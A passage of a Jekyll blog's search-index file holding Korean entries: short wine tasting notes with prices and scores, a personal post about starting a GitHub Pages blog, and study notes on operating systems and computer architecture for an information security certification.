var store = [{
        "title": "Villa M 3(Some) 빌라엠 썸",
        "excerpt":"1. 구매정보     빈티지 :   가격 : 13900 원   구매처 : 영등포 이마트   2. 비비노      링크없음   2. 감상     1일차            약발포성 스윗 레드 와인       향이 강하지 않음       단 맛, 단순한 맛       도수 낮음           3. 총점     2.5/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_villa_M_some/",
        "teaser": null
      },{
        "title": "캔달잭슨 빈트너스 리저브 샤도네이 (2018)",
        "excerpt":"1. 구매정보     빈티지 : 2018   가격 : 38000 원   구매처 : 롯데백화점 본점   2. 비비노      링크   2. 감상     1일차            달콤 새콤한 향,  빵 냄새       약한 단 향으로 시작해서 산도, 스파이시 한 뒷맛           2일차            포도냄새, 꿀향       배 맛, 신 맛           3일차            신 맛이 조금 사라짐       백포도 맛           3. 총점     3.8/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_KJVintnersChad/",
        "teaser": null
      },{
        "title": "Ca'momi di rosso 카모미 디 로쏘 (2018)",
        "excerpt":"1. 구매정보     빈티지 : 2018   가격 : 17000 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            가죽냄새,  알콜향, 오크향       매운 향신료, 떫은 맛           2일차            레드베리, 블랙베리       부드러움           3일차            빵 냄새           3. 총점     3.7/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_Camomi_di_rosso/",
        "teaser": null
      },{
        "title": "Porto tawny valdouro 포르투 발도우로, 토니 포트",
        "excerpt":"1. 구매정보     빈티지 :   가격 : 17000 원   구매처 : 영등포 이마트   2. 비비노      링크   2. 감상     1일차            강한 알콜향, 래드베리 향       레드베리 맛, 스모키한 향           2일차            달콤한 꿀 향, 바닐라 향       잼           3일차            딸기잼 맛, 바닐라 향           3. 총점     3.5/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_krohn-porto-tawny-valdouro/",
        "teaser": null
      },{
        "title": "Louis Latour Bourgogne Chardonnay 루이 라뚜르 샤르도네 (2018)",
        "excerpt":"1. 구매정보     빈티지 : 2018   가격 : 25000 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            가죽향, 사과향       텁텁하고 신 맛과 약간의 단맛, 짧은 피니쉬           2일차            버터향, 사과향, 시트러스향       파인애플 맛, 풀 맛           3일차            꿀 향, 파인애플 향       쓴 맛, 파인애플 맛, 버터           3. 총점     2.5/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_louis-latour-bourgogne-chardonnay/",
        "teaser": null
      },{
        "title": "Mud House Sauvignon Blanc 머드하우스 소비뇽 블랑 (2019)",
        "excerpt":"1. 구매정보     빈티지 : 2019   가격 : 27900 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            맑은 연두색, 레몬색       레몬, 자몽, 시트러스 향       레몬맛, 자몽맛, 산미           3. 총점     3/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_mud-house-sauvignon-blanc/",
        "teaser": null
      },{
        "title": "Github Blog 생성 및 첫 포스트 (jekyll)",
        "excerpt":"예전부터 뭔가를 남기고 싶다는 생각을 자주 했었다.  외로워서 일까?  난 예전부터 여럿이 있는 것은 지치고 혼자 있을 때가 편했었다. 좋고 싫음과는 별개의 문제인 것 같다.  요즘은 인스타그램이나 유튜브 같은 것들이 핫하지만 내 성격 상 그런 활동을 할 것 같지는 않다.   블로그를 하는 이유는 아마도 내가 여기에 있음을 알리고 싶기 떄문일 것이다.  세상에 도움이 되고자 하는 고귀한 이유도, 나의 지식을 누군가에게 알려주고싶은 거창한 이유도 아니다.  애초에 내겐 누군가를 가르칠 수준의 전문적인 지식이 없다.  내가 아는 것이라곤 짧은 흥미에 기인한 파편적인 정보들 뿐이다.   블로그를 처음 해보는 것도 아니다.  싸이월드 (관심병과 외로움에 수 많은 흑역사를 쓴) 부터 개인홈페이지 (만들었으나 운영은 하지 않았던) 도 만들어 보고, 네이버 블로그 (당시에는 모양이 이쁘지 않아 생성만 해 봄), 워드프레스 (글 몇개 끄적이다 호스팅 비만 나가는 것 같아 그만둔) 도 했었다.  결정적으로 소통에 실패했던 것 같다.   이번에는 얼마나 오랫동안 유지하게 될까?   그래도 뭔가 도움이 되는 내용을 남겨야 할텐데.   Github 을 이용한 Github Page Blog 는 아래의 링크에서 정보를 얻었다.  고맙게도 친절하게 글을 남겨주셨다. (따라하기만 하면 되니 큰 어려움은 없다.)   GitHub 블로그 시작하기   나는 개발자 (엄밀히 말하면 운영자일까?) 이지만 Node.js 나 Ruby, Github 에 대해서는 잘 모른다. 하지만 Github Page 를 이용한 블로그를 운영하기 위해서는 약간의 프로그래밍과 Github 과 Markdown 에 대한 기초 지식은 필요한 것 같다.   가장 큰 장점은 md (Markdown) 파일을 작성하면 html 웹페이지로 생성해 준다는 점인 것 같다.   설치가 끝난 뒤 자세한 세팅, 사용법은 아래 링크를 찾아보면 될 것 같다. 역시 공식 사이트(영어…) 의 가이드가  가장 볼만한 듯 하다.   minimal-mistakes 퀵 스타트 가이드   ","categories": ["Journal","Blogging"],
        "tags": ["테스트","Journal","Blogging"],
        "url": "https://bluesplatter.com/journal/blogging/first-post/",
        "teaser": null
      },{
        "title": "01.시스템보안 - 01.운영체제 이해 및 관리",
        "excerpt":"운영체제 개요          운영체제의 정의 : 컴퓨터 시스템의 자원을 효율적으로 관리, 사용자가 컴퓨터를 효과적으로 사용할수 있도록 환경을 제공하는 여러 프로그램의 모임            운영체제의 목적             처리 능력의 향상 : 시간당 작업 처리량(Throughput), 평균 처리시간 개선       신뢰성 향상 : 실패 없이 주어진 기능을 수행할 수 있는 능력       응답시간의 단축 : 사용자가 시스템에 의뢰한 작업의 반응 시간 단축       자원 활용률 향상 : 자원의 공유, 상호배제를 통해 자원 효율적 활용       가용성 향상 : 고장과 오류가 발생해도 운영 영향 최소화           운영체제 종류   1. 종류     Batch : 순차적, 한꺼번에 처리   Multi Programming : N개 프로그램 기동, CPU 가동률 극대화, 유휴 시간 최소화, 스케줄링 필요   Time Sharing : 시간을 분할하여 CPU 사용   Multi Process : 다중 CPU   Real Time System : 실시간 처리   Multi-Mode : 다중 운영체제 (일괄처리, 시분할, 다중처리, 실시간 처리)   Distributed System : 네트워크로 분산된 운영체제   2. 프로세스와 스레드     프로세스(Process)            레지스터, 스택, 포인터, 실행중인 프로그램, 데이터 등의 집합체이다.       실행중인 프로세스(가장 보편적인 정의)이다.       프로세서에 의해 수행되는 프로그램 단위로 현재 실행 중이거나 곧 실행 가능한 PCB(Process Control Block)를 가진 프로그램이다.           스레드(Thread)            제어의 흐름을 의미하는 것으로 프로세스에서 실행의 개념만을 분리한 개념이다.       프로세스의 구성을 크게 제어의 흐름 부분(실행 단위)과 실행 환경 부분으로 나눌 때, 스레드는 프로세스의 실행 부분을 담당함으로써 실행의 기본 단위가 된다.                Thread 와 Process 비교                                  구분           Thread           Process                                           상호통신           ⦁ Library Call ⦁ 요청 Thread만 Blocking            ⦁ System Call ⦁ Call 종료 시까지 전체 자원 Blocking                             처리방식           CPU를 이용하는 기본 작업단위로 구분           자원 할당을 위한 기본 구분 단위                             부하           프로세스보다 상대적으로 부하 발생이 적음           ⦁ Context Switching으로 인한 부하 발생 ⦁ 프로세스 자원 할당 시 부하 발생                           CPU 스케줄링 (CPU 점유)   1. 프로세스 상태전이      운영체제-프로세스 실행 제어, 프로세스에 대한 정보 유지를 담당   프로세스 실행 결정 및 필요한 시스템 자원을 할당하는 과정   프로세스의 상태 변환을 위해 OS 는 작업 스케줄러(Job Scheduler), 프로세스 스케줄러(Process Scheduler) 두 종류의 CPU 스케줄러를 사용   2. 프로세스 상태전이도(Process State Transition Diagram)      이미지 출처      과정            프로세스가 실행되면 모든 프로세스는 준비상태의 준비 큐(FIFO)로 들어간다.       준비 큐의 프로세스는 CPU 스케줄링 알고리즘에 의해서 CPU를 점유하게 되고 프로세스를 실행한다.       CPU에서 실행중인 프로세스가 Time out이 되면 다시 준비 큐의 뒤로 들어가고 CPU를 점유할 때까지 대기한다.       만약 실행중인 프로세스가 디스크 입출력과 같은 작업이 발생하면 대기 상태가 되고 입출력을 수행한다.       입출력이 완료되면 다시 프로세스는 준비상태로 들어가 대기하게 된다.                Active 모드에서의 프로세스 상태 변환                                  상태                       상태 변환 내용                                           Admit           생성-&gt;준비           준비 큐가 비어있을 떄(작업 스케줄러가 담당)                             Dispatch           준비-&gt;실행           ⦁ 준비 큐에 있는 하나의 프로세스를 선택하여 CPU를 할당 ⦁ 프로세스 스케줄러(Process Scheduler)가 담당                             Timer Run out           실행-&gt;준비           ⦁ CPU를 할당받은 프로세스가 CPU의 제한된 사용시간을 모두 쓴 경우에 발생 ⦁ CPU 스케줄링 정책에 따라 우선순위가 높은 프로세스에게 CPU를 양보할 때, 운영 체제 자체의 CPU 서비스 요청 시 전이됨(선점)                             Blocked           실행-&gt;슬립 (대기)           CPU를 할당 받은 프로세스가 I/O 요구, 다른 자원요구 등 CPU 이외의 서비스 작업을 원할 때 발생                             Wake up           슬립-&gt;준비 (대기)           대기 중이던 사건(조건)의 처리가 끝났을 때 발생 (예:I/O 작업 완료)                             Release           실행-&gt;종료           프로세스의 정상/비정상 종료 시 발생                           문맥 교환(Context Switching)            CPU가 이전의 프로세스 상태를 PCB에 보관하고, 또 다른 프로세스의 정보를 PCB에서 읽어 레지스터에 적재하는 과정       프로세스가 준비-&gt;실행, 실행-&gt;준비, 실행-&gt;대기 등으로 상태 변경될 때 발생                    PCB (Process Control Block)                            운영체제가 프로세스를 제어하기 위해 정보를 저장해 놓는 곳               프로세스의 상태 정보를 저장하는 구조체               프로세스 상태 관리와 문맥교환(Context Switching)을 위해 필요               PCB는 프로세스 생성 시 만들어지며 주기억장치에 유지됨                                   PCB에서 유지되는 정보                            PID(Process ID) : 프로세스 고유의 번호 (식별자)               PC(Program Counter) : 프로세스에서 다음에 실행될 명령의 주소를 가리키는 포인터               Process State : 준비, 대기, 실행 등의 상태               CPU Registers : 실행 정보를 저장하는 여러 레지스터 정보               Priority : 스케줄링 및 프로세스 우선순위               Accounting Information : CPU 사용시간, 실제 사용된 시간               Memory Pointers : 메모리 관리 정보               입출력 상태 정보               할당된 자원 정보                                                   3. CPU 스케줄링 기법                  구분       선점(Preemptive)       비선점(Non-preemptive)                       개념       프로세스가 CPU 점유 중에도 다른 프로세스가 CPU 점유 가능       프로세스가 CPU를 해제할 때까지 다른 프로세스는 대기                 장점       ⦁ 빠른 응답, 모바일, RTOS ⦁ 대화식 시분할 적합       ⦁ 응답 시간 예상 용이 ⦁ Batch Process 적합 ⦁ 프로세스에 대한 요구를 공정하게 처리                 단점       Overhead 발생(Context-Switching)       짧은 작업에도 장기간 대기하는 경우가 발생                 스케줄링 기법       Round-robin ⦁ FCFS에 의해 프로세스들이 내보내지며 각 프로세스는 같은 크기의 CPU 시간을 할당한다. ⦁ CPU 시간이 만료될 때까지 처리를 완료하지 못하면 CPU는 대기중인 다음 프로세스로 넘어가며 실행 중이던 프로세스는 준비 완료 리스트의 가장 뒤로 보내진다.  SRT(Shortest Remaining time) ⦁ SJF와 마찬가지로 새로 도착한 프로세스를 포함하여 처리가 완료되는 데까지 가장 짧은 시간이 소요된다고 판단되는 프로세스를 먼저 수행한다. ⦁ 실행 중인 프로세스라도 남은 처리 시간이 더 짧다고 판단되는 프로세스가 생기면 언제라도 실행중인 프로세스가 선점된다. Multi Level Queue ⦁ 여러 종류의 그룹 (시스템 작업, 대화형 작업, 편집 작업, 일괄처리형 작업…) 으로 나누어 여러 개의 큐를 이용하는 스케줄링 기법이다. ⦁ 각각의 준비 큐에 넣어두고 각 큐의 독자적인 스케줄링 알고리즘에 따라서 CPU를 할당받는 방법이다. Multi Level Feedback Queue ⦁ 입출력 위주와 CPU 위주인 프로세스의 특성에 따라 서로 다른 타임 슬라이스를 부여한다. ⦁ 새로운 프로그램이 들어오면 높은 우선순위를 할당해 주어 단계 1에서 즉시 수행하고, 점차 낮은 우선순위를 부여하며 단계 n에서는 라운드로빈으로 순환한다. ⦁ 우선순위 Queue와 Round Robin을 모두 사용하는 Hybrid 스케줄링 기법       FCFS(First Come First Service) ⦁ 대기 큐에 도착한 순서에 따라 CPU를 할당한다. ⦁ 긴 작업이 짧은 작업을 오랫동안 기다리게 할 수 있으며, 중요하지 않은 작업이 중요한 작업을 기다리게 할 가능성이 존재한다(대화식 Real Time 시스템에는 부적합). SJF(Shortest Job First) ⦁ 기다리고 있는 작업 중에서 수행 시간이 가장 짧다고 판단된 것을 먼저 수행한다. ⦁ 큰 작업에 대해서는 FCFS에 비해 대기시간 예측이 어렵다.           교착상태 (Deadlock) - 자원 경합  1. 상호배제 기법의 정의     다수의 프로세스가 동일 자원에 접근 시 무결성을 보장하기 위한 기법   두 개 이상의 프로세스가 공유 자원에 동시에 읽기/쓰기를 못하게 하는 상호배제 매커니즘   임계영역의 개념을 이용하여 두 프로세스가 하나의 고유 자원을 상호 배타적으로 사용   2. 임계영역     정의            공유 자원의 독점을 보장하는 코드 영역. 지정된 시간이 지난 후 종료됨       임계구역에 들어가거나 나올 때는 세마포어 같은 동기화 메커니즘이 사용됨.                전형적인 병행프로세스의 구조         do {       wait(mutex); // 진입구역       // 임계구역       signal(mutex); // 출구구역       // 나머지구역   } while()                  진입 구역 (entry section) : 임계 구역에 진입하기 위해 허용을 요구한 코드 영역       출구 구역 (exit section) : 임계 구역 다음에 나오는 영역으로 임계 구역을 벗어나기 위한 코드 영역       나머지 구역 (remainder section) : 프로그램의 나머지 코드 영역           3. 발생 조건                  조건       세부 내용                       상호배제 (Mutual Exclusion)       ⦁ 프로세서들이 자원을 배타적 점유 ⦁ 다른 프로세서들이 자원 사용 불가 ⦁ 한 번에 한 프로세스만이 자원 사용가능                 점유와 대기 (Hold and Wait)       부분 할당, 다른 종류의 자원을 부가적으로 요구하면서, 이미 어떤 자원을 점유하고 있음                 비선점 (Non-preemption)       ⦁ 자원들은 그들을 점유하고 있는 프로세스로부터 도중에 해제되지 않음 ⦁ 프로세스들 자신이 점유한 자원을 해제할 수 있음                 환형대기 (Circular Wait)       프로세스와 자원들이 원형을 이루며, 각 프로세스는 자신에게 할당된 자원을 가지면서, 상대방 프로세스의 자원을 상호 요청하는 경우           4. 대응 기법          예방 : 교착상태의 필요조건을 부정                                  조건           세부 내용                                           점유와 대기 조건의 부정           각 프로세스는 필요한 자원들을 모두 한꺼번에 요청                             비선점 조건의 부정           ⦁ 이미 자원을 가지고 있는 프로세스 -&gt; 자원 할당 요구 있을 시 받아들여지지 않으면 -&gt; 보유 자원 반납 ⦁ 반납 후 필요 자원에 대한 요구 다시 시도 ⦁ 무기한 연기 가능성 존재                             환형대기 조건의 부정           ⦁ 모든 프로세스에게 각 자원의 유형별로 할당순서를 부여 ⦁ 실행 중 우선순위의 변동이나 새로운 자원 추가 시 구성이 어려움                             상호 배제 조건 부정           ⦁ 상호 배제 조건은 비 공유를 전제 ⦁ 공유 가능한 자원들은 배타적인 접근을 요구하지 않으므로 교착상태가 될 수 없음                           회피 : 교착상태 가능성을 배제하지 않고, 적절하게 피해 나가는 방법 (은행원 알고리즘)            안전 상태(Safe State) : 시스템이 교착상태를 일으키지 않으면서 각 프로세스가 요구한 최대 요구량만큼 필요한 자원을 할당해 줄 수 있는 상태로 안전순서열이 존재하는 상태       불안전 상태(Unsafe State) : 안전순서열이 존재하지 않는 상태. 교착상태는 불안전 상태에서만 발생함.       안전 상태 개념을 이용하여 교착상태 회피 알고리즘 구성. 현재 가용자원을 프로세스 요청 시 바로 할당해 줄 것인지 기다리게 할 것인지를 결정하는 문제                탐지 : 교착상태 발생을 허용하고, 발생 시 원인을 규명하여 해결 (자원 할당 그래프)                                  기법           세부 내용                                           교착상태 발견 알고리즘           ⦁ 교착상태 발생 여부를 파악하기 위하여 시스템의 상태를 검사하기 위한 알고리즘 ⦁ 교착상태의 발생 빈도 수 ⦁ 교착상태가 발생하였을 때 영향을 받는 프로세스의 수                             자원 할당 그래프           ⦁ 방향 그래프를 이용하여 자원의 할당사항과 요구사항을 나타내는 기법 ⦁ 자원 할당 그래프의 소거법을 이용하여 교착상태 감지 ⦁ 실행을 완료할 수 있는 프로세스와 교착상태에 빠진 프로세스를 결정                                복구 : 교착상태 발견 후 환형대기를 배제시키거나 자원을 중단하는 메모리 할당 기법                                  기법           상세내용                                           프로세스 중지           ⦁ 교착상태 프로세스들을 모두 중지하는 방법 ⦁ 교착상태가 해결될 때까지 한 프로세스씩 중지 ⦁ 희생자 선택의 원칙:최소 비용으로 중지시키는 방법을 찾아야 함                             자원 선점           ⦁ 프로세스로부터 자원들을 선점하여, 이들 자원을 교착상태가 해결될 때까지 다른 프로세스들에게 할당 ⦁ 희생자 선정, 복귀(rollback) 문제, 기아 상태 문제 등을 고려                           디스크 스케줄링   1. 디스크 개념     Arm : head 가 고정되어 있는 장치   Head : 디스크로부터 정보를 읽어들임   Sector : 디스크에 정보가 저장되는 최소 단위   Track : 연속된 sector의 공간   Cylinder : 수직으로 연속되는 track의 집합   Platter : 데이터가 저장되는 자기 디스크   디스크의 주소를 찾는 과정 : 디스크 번호 -&gt; Platter 번호 -&gt; Track 번호 -&gt; Sector 번호 -&gt; 지정된 주소   2. 디스크 접근 시간     탐색시간(Seek time) : 현 위치에서 특정 실린더(트랙)로 디스크 헤드가 이동하는 데 소요되는 시간   회전 지연시간(Rotation delay time) : 가고자 하는 섹터가 디스크 헤드까지 도달하는 데 걸리는 시간   전송시간(Transfer time) : 데이터를 전송하는 데 걸리는 시간   3. Disk Scheduling 의 종류      그림 삽입   FCFS(First-Come First Served)            가장 먼저 도착한 요청을 우선적으로 처리       장점 : 개발이 용이, 공평성 유지       단점 : 이동 경로가 길어짐           SSTF(Shortest-Seek Time First)            탐색 거리가 가장 짧은 트랙에 대한 요청을 먼저 서비스함       현재 Head 위치에 가까운 요청을 우선적으로 처리       장점 : 전반적인 Seek time 감소       단점 : Starvation 현상 발생 가능           SCAN(엘리베이터 알고리즘)            SSTF가 갖는 탐색시간의 편차를 해소하기 위한 기법       Head가 이동하는 방향의 모든 요청을 서비스하고, 끝까지 이동한 후 역방향의 요청을 서비스함           C-SCAN(Circular-SCAN)            바깥쪽에서 안쪽으로 이동       안쪽 방향으로 끝까지 이동을 반복       끝에 도달하면 바깥쪽으로 이동하여 요청을 다시 처리           C-LOOK(Circular-Look)            C-SCAN의 보완, 대기시간을 좀 더 균형 있게 함       헤드 이동 방향의 마지막 입출력 요청을 처리한 후 디스크 헤드를 처음 위치로 이동하여 다음 입출력 요청을 처리           디스크 RAID      RAID(Redundant Array of Independent Disk)의 개념            저용량, 저성능, 저가용성인 디스크를 배열(Array) 구조로 중복 구성함으로써 고용량, 고성능, 고가용성 디스크를 대체하고자 함.       데이터 분산 저장에 의한 동시 엑세스 가능, 병렬 데이터 채널에 의한 데이터 전송 시간의 단축           RAID 0(Stripe, Concatenate)            최소 디스크 2개       작은 디스크를 모아 큰 디스크로 만드는 기술       데이터를 나누어 저장하지만 중복 저장하지는 않기 때문에 장애시 복구 불가           RAID 1(Mirroring)            데이터를 완전 이중화 하여 저장(고비용)       디스크 장애시 복구 가능       디스크 Read 와 Write 가 병렬적으로 실행되어 속도가 빠름           RAID 2(Hamming Code ECC)            ECC(Error Correction Code)기능이 없는 디스크의 오류 복구를 위해 개발됨.       Hamming Code 를 이용하여 오류를 복구       별도의 디스크에 복구를 위한 ECC를 저장           RAID 3(Parity ECC)            Parity 정보를 별도 Disk에 저장(Byte 단위 I/O)       1개의 디스크 장애 시 Parity 를 통해 복구 가능       RAID 0(Stripping)으로 구성된 데이터 디스크의 입출력 성능은 향상되나, Parity 계산 및 별도 디스크 저장으로 Write 성능이 저하됨.           RAID 4(Parity ECC, Block 단위 I/O)            Parity 정보를 별도 Disk에 저장(Block 단위 I/O)       RAID 3와 동일           RAID 5(Parity ECC, Parity 분산 저장)            분산 Parity를 구현하여 안정성이 향상됨.       최소 3개의 디스크가 요구됨.           RAID 6(Parity ECC, Parity 분산 복수 저장)            RAID 5의 안전성 향상을 위해 Parity를 다중화하여 저장       장애 디스크 복구 이전에 추가 장애 발생 시 복구가 불가한 문제를 해결       장애가 발생된 상황에서 추가 디스크 장애가 발생해도 정상 동작함          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","시스템 보안","운영체제"],
        "url": "https://bluesplatter.com/is_certification/ISCert-01System-01OS/",
        "teaser": null
      },{
        "title": "01.시스템보안 - 02.컴퓨터 구조",
        "excerpt":"CPU (속도 빠름, 고가) - 연산처리   1. CPU 구조      이미지 출처                  구성요소       상세 기능                       ALU(연산장치)       ⦁ 각종 산술연산들과 논리연산들을 수행하는 회로 ⦁ 산술연산 : +, -, *, / ⦁ 논리연산 : AND, OR, NOT, XOR                 Register(레지스터)       ⦁ CPU 내부의 소규모 데이터나 중간 결과를 일시적으로 기억해 두는 고속의 전용 영역 ⦁ 컴퓨터 기억장치 중 Access 속도가 가장 빠름                 Control Unit(제어장치)       프로그램 코드(명령어)를 해석하고, 그것을 실행하기 위한 제어 신호들(Control Signals)을 발생시킴                 내부 CPU 버스       ALU와 레지스터 간의 데이터 이동을 위한 경로           2. Register                  종류       내용                       PC(Program Counter)       다음에 수행할 명령어가 저장된 주기억장치의 번지를 지정                 MAR(Memory Address Register)       주기억장치에 접근하기 위한 주기억장치의 번지를 기억                 MBR(Memory Buffer Register)       주기억장치에 입/출력할 자료를 기억하는 레지스터                 IR(Instruction Register)       주기억장치에서 인출한 명령코드를 기억하는 레지스터           3. 버스 (전송 라인)                  종류       내용                       데이터 버스(Data Bus)       시스템 컴포넌트 간 처리 데이터를 전송하기 위한 용도                 주소 버스(Address Bus)       ⦁ 기억장소의 위치 또는 장치 식별을 지정하기 위한 라인 ⦁ 라인의 비트 수에 따라 접속될 수 있는 장치의 용량이 결정됨                 제어 버스(Control Bus)       CPU와 기억장치 또는 I/O 장치 사이의 제어 신호를 전송하는 라인           4. Instruction Cycle                  단계       동작설명                       인출(Instruction Fetch)       인출단계는 메모리(Memory)에서 데이터를 로드(Load)하여 CPU에 있는 레지스터(Register)에 적재하는 과정                 간접(Indirect)       ⦁ 메모리를 참조할 때 간접주소 방식을 사용하는 경우에 실행 ⦁ 간접주소란 CPU가 메모리를 참조했을 때 데이터가 존재하는 것이 아니라 메모리에 주소가 존재하여 메모리 내에서 한 번 더 조회해서 데이터를 얻는 것                 실행(Execution)       명령과 데이터로 CPU가 산술 및 논리연산을 수행하는 것                 인터럽트(Inturrupt)       ⦁ 컴퓨터 작동 중 예기치 않은 문제가 발생한 경우라도 업무 처리가 계속될 수 있도록 하는 컴퓨터 운영체제의 한 기능으로, 크게 하드웨어 인터럽트와 소프트웨어 인터럽트로 나눔 ⦁ SVC 하드웨어 인터럽트 : 기계착오 인터럽트, 외부 인터럽트, 입출력 인터럽트, 프로그램 검사 인터럽트 ⦁ 소프트웨어 인터럽트 : CPU 내부에서 자신이 실행한 명령이나 CPU의 명령 실행에 관련된 모듈이 변화하는 경우 발생           메모리 - 임시 기억   1. 캐시 메모리      CPU와 Memory 속도 차이 해결   캐시사상 방법            직접사상                    메인 메모리를 분할하여 Cache 슬롯과 매핑           장점 : 매핑 절차가 단순하고 신속하게 처리           단점 : 높은 캐시 미스율 (같은 블록에 사상되는 데이터 캐시 적재 시 교체 발생)                       연관사상(가장 빠름)                    메인 메모리의 각 블록이 Cache 어느 슬롯이든 적재 가능           장점 : 지역성 높은 접근 시 캐시 적중률 높음           단점 : 구현 하드웨어가 복잡하여 구현 비용 상승                       집합연관사상                    직접/연관 절충안으로 메인메모리 구역을 셋으로 묶어 Cache 슬롯과 매핑           장점 : 직접사상과 연관사상의 장점 수용           단점 : 캐시 Fin/Fout 발생 증가. 구현 비용이 많이 듦.                                교체기법 :                                  종류           세부 내용           특징                                           Random           교체될 page 를 임의 선정           overhead 적음                             FIFO  (First in First Out)           캐시 내에 오래 있었던 page 교체           자주 사용되는 page가 교체될 우려                             LFU  (Least Frequently Used)           사용 횟수가 가장 적은 page 교체           최근 적재된 page가 교체될 우려                             LRU  (Least Recently Used)           가장 오랫동안 사용되지 않은 page 교체           time stamping overhead 존재                             Optimal           향후 가장 참조되지 않을 page 교체           실현 불가능                             NUR  (Not Used Recently)           참조비트, 수정비트로 미사용 page 교체           최근 사용되지 않은 page 교체                             SCR  (Second Chance Replacement)           최초 참조비트 1로 셋, 1인 경우 0으로 셋, 0인 경우 교체           기회를 한번 더 줌                                페이지 교체 관리 시 문제점 :                                  문제점           세부 내용                                           Page Fault 발생 (페이지 부재)           기억장치에 적재되지 않은 Page를 사용하려 할 때 Page Fault 발생                             Demand Paging (요구 페이징)           요구될 때에만 Process가 Page를 적재하는 방식                             Thrashing 발생 (스레싱)           Page 부재가 너무 빈번하게 발생하여 CPU가 Process 수행보다 Page 교체에 더 많은 시간을 소요하는 비정상적인 현상                                페이지 부재 예방                                  종류           세부 내용                                           Load Control           일정 시간 동안 새로운 프로세서가 생성되는 것을 지연시키고 Suspend Queue에 대기시켜서 Thrashing 현상을 감소시킴                             Locality(구역성)           시간과 공간 지역성을 집중적으로 참조함                             Working Set(워킹셋)           일정 시간 동안 참조되는 페이지 집합(Working Set)을 주기억장치에 유지                             PFF(Page Fault Frequency)           ⦁ Process의 Page Fault 빈도에 따라 Residence set을 조정 ⦁ PFF가 높으면 Residence set의 크기 증가, 낮으면 감소                           캐시 메모리 일관성 (Cache Coherence)            캐시 메모리 일관성 유지 방식                    멀티프로세서 환경에서 각 프로세서가 캐시를 보유하며 캐시에 로드된 데이터를 변경한 경우 주기억장치의 데이터와 동일하게 유지하는 메커니즘                       Write through                    CPU가 캐시 메모리와 주기억장치를 동시에 수정                       Write back                    캐시 메모리만 수정 후 나중에 일괄적으로 주 기억장치를 수정                           2. 가상 메모리      가상 메모리의 개념            보조기억장치를 주기억장치처럼 사용하여 주기억장치의 공간을 확대           가상 메모리 관리 단위            페이지(page) : 가상 기억장치 상에서 동일한 크기의 최소 논리 분할 단위로 나눈 것                세그먼트(segment) : 사용자 주소 공간을 용도별로 논리적 단위로 나눈 것                                                  구분               Paging 기법               Segment 기법                                                               할당               고정(Static) 분할               가변(Dynamic) 분할                                         적재               요구 Page만 일부 적재(On-demand)               프로그램 전체 적재(On-demand)                                         관점               메모리 관리 측면               파일 관리 측면                                         장점               ⦁ 요구 Page만 적재 Load ⦁ 외부 단편화 해결 ⦁ 교체시간 최소               ⦁ 사용자 관점 ⦁ 개발/프로그래밍 용이 ⦁ 내부 단편화 해결 ⦁ 코드, 데이터 공유 용이                                         단점               ⦁ 내부 단편화(Fragmentation) 발생 ⦁ Thrashing, 잦은 디스크 I/O 유발               ⦁ 외부 단편화 심각 ⦁ 메인 메모리가 커야 함                                                      내부 단편화 : 블록 내 할당 공간을 모두 사용하지 않고 빈 공간이 생김           외부 단편화 : 블록과 블록사이의 빈 공간이 프로그램보다 작아 활용할 수 없음                                가상 메모리 관리 정책                                  종류           세부 내용           기법의 유형                                           할당 기법 (Allocation)           프로세스에게 할당되는 메모리 블록의 단위를 결정           고정 할당, 가변 할당, Paging, Segmentation                             호출 기법 (Fetch Policy)           보조기억장치에서 주기억장치로 적재할 시점 결정           Demand Fetch, Pre Fetch                             배치 기법 (Placement)           요구된 페이지를 주기억장치의 어느 곳에 적재할 것인지를 결정           First fit, Best fit, Next fit, Worst fit                             교체 기법 (Replacement)           주기억장치 공간 부족 시 교체 대상 결정           Random, FIFO, LRU, LFU, NUR, SCR, Optimal                                할당 정책(Allocation Policy)                                  구분           종류           세부 내용                                           연속 할당           고정 분할           ⦁ 고정된 크기의 단위로 메모리 할당 ⦁ 내부 단편화 발생                                         가변 분할           ⦁ 할당 단위를 요청마다 다른 크기로 할당 ⦁ 외부 단편화 발생                             비연속 할당           Paging           가상 메모리 블록을 페이지 단위 관리. TLB와 MMU, Page table로 관리                                         Segmentation           가변 크기인 세그먼트로 분할, Segment Table로 관리                           I/O  인터페이스   1. I/O Interface      CPU 경유 유무에 따른 분류            CPU 경유 : 프로그램에 의한 I/O, 인터럽트에 의한 I/O                    프로그램에 의한 I/O                            컴퓨터 메모리에 기록된 입출력 명령에 의해 수행               CPU가 주변장치를 연속 감시하는 Polling 방식               프로세서의 시간을 낭비하고 처리 효율이 낮음                                   인터럽트에 의한 I/O                            CPU가 주변 장치들의 데이터 전송을 위한 인터럽트 요청을 감지하면 수행 중이던 작업을 중단하고 데이터 전송을 처리하기 위해 서브루틴으로 분기하여 전송을 수행                                               CPU 비경유 : DMA (Direct Memory Access Controller) Channel I/O                    CPU의 개입 없이 I/O 장치와 기억장치 사이의 데이터를 전송하는 방법           속도가 빠르다.                           DMA 동작 방식            Cycle Stealing : DMA 제어기와 CPU가 BUS 를 공유하며, CPU가 BUS를 사용하지 않는 사이클에만 접근한다. CPU보다 높은 우선순위를 가진다.       Burst Mode : DMA 제어기가 BUS를 점유하며, 동작 완료 후 BUS의 점유를 해제한다.           2. I/O Processor      채널에 의한 입출력            Selector 채널 : 한 번에 한 개씩 데이터를 주기억장치에게 전송       Multiplexer 채널 : 동시에 많은 데이터를 전송                    Byte Multiplexer           Block Multiplexer                       I/O 장치의 다양함, 복잡함                    CPU나 DMA 대신 독립된 입출력 프로세서인 채널이 입출력을 담당           채널이 입출력을 수행하는 동안 CPU는 다른 작업을 처리해 효율 향상                           I/O Processor의 종류            Multiplexer Channel                    저속장치(Printer, Serial 등) 연결           시분할 방식으로 Byte 단위 전송                       Selector Channel                    고속장치(Disk, CDROM), 단일 